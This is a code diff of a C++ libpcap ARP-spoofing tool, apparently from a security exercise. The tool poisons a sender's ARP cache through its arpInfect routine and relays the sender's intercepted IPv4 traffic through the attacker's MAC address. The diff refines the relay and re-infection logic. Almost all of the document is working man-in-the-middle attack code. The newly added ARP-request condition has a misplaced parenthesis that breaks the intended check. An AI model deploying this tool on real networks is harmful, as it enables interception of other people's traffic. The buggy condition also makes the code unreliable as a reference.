@@ -81,7 +81,7 @@ int getMyAddress(char *if_name, Ip *attacker_ip, Mac *attacker_mac)
     return 0;
 }
 
-int getMac(pcap_t *handle, Ip attacker_ip, Mac attacker_mac, Ip sender_ip, Mac *sender_mac)
+int getMac(pcap_t *handle, Ip attacker_ip, Mac attacker_mac, Ip ip, Mac *mac)
 {
     EthArpPacket packet_;
 
@@ -97,7 +97,7 @@ int getMac(pcap_t *handle, Ip attacker_ip, Mac attacker_mac, Ip sender_ip, Mac *
     packet_.arp_.smac_ = attacker_mac;
     packet_.arp_.sip_ = htonl(Ip(attacker_ip));
     packet_.arp_.tmac_ = Mac("00:00:00:00:00:00");
-    packet_.arp_.tip_ = htonl(Ip(sender_ip));
+    packet_.arp_.tip_ = htonl(Ip(ip));
 
     int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet_), sizeof(EthArpPacket));
     if (res != 0)
@@ -121,11 +121,11 @@ int getMac(pcap_t *handle, Ip attacker_ip, Mac attacker_mac, Ip sender_ip, Mac *
 
         struct EthHdr *eth_hdr = (struct EthHdr *)(packet);
         struct ArpHdr *arp_hdr = (struct ArpHdr *)(packet + sizeof(EthHdr));
-        if (ntohs(eth_hdr->type_) == EthHdr::Arp && ntohs(arp_hdr->op_) == ArpHdr::Reply && ntohl(arp_hdr->sip_) == sender_ip)
+        if (ntohs(eth_hdr->type_) == EthHdr::Arp && ntohs(arp_hdr->op_) == ArpHdr::Reply && ntohl(arp_hdr->sip_) == ip)
         {
             if (eth_hdr->dmac_ == attacker_mac)
             {
-                memcpy((void *)sender_mac, &eth_hdr->smac_, sizeof(Mac));
+                memcpy((void *)mac, &eth_hdr->smac_, sizeof(Mac));
                 break;
             }
         }
@@ -232,7 +232,7 @@ int main(int argc, char *argv[])
             if (ntohs(eth_hdr->type_) == EthHdr::Ip4)
             {
                 struct ip *ip_hdr = (struct ip *)(packet + sizeof(EthHdr));
-                if (eth_hdr->smac_ == flow[i].sender_mac && eth_hdr->dmac_ == attacker_mac && ntohl(ip_hdr->ip_src.s_addr) == flow[i].sender_ip)
+                if (eth_hdr->smac_ == flow[i].sender_mac && eth_hdr->dmac_ == attacker_mac && ntohl(ip_hdr->ip_src.s_addr) == flow[i].sender_ip && ntohl(ip_hdr->ip_dst.s_addr) != attacker_ip)
                 {
                     EthIpPacket *packet_ = (EthIpPacket *)packet;
                     packet_->eth_.smac_ = attacker_mac;
@@ -244,12 +244,14 @@ int main(int argc, char *argv[])
                         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                         return -1;
                     }
+
+                    break;
                 }
             }
             else if (ntohs(eth_hdr->type_) == EthHdr::Arp)
             {
                 struct ArpHdr *arp_hdr = (struct ArpHdr *)(packet + sizeof(EthHdr));
-                if (ntohs(arp_hdr->op_) == ArpHdr::Request && (ntohl(arp_hdr->tip_) == flow[i].target_ip || ntohl(arp_hdr->sip_) == flow[i].target_ip))
+                if (ntohs(arp_hdr->op_) == ArpHdr::Request && ((ntohl(arp_hdr->sip_) == flow[i].sender_ip && ntohl(arp_hdr->tip_)) == flow[i].target_ip || ntohl(arp_hdr->sip_) == flow[i].target_ip))
                 {
                     if (arpInfect(handle, attacker_mac, flow[i].sender_ip, flow[i].sender_mac, flow[i].target_ip) == -1)
                     {
@@ -261,6 +263,7 @@ int main(int argc, char *argv[])
         }
     }
 
+    free(flow);
     pcap_close(handle);
     return 0;
 }
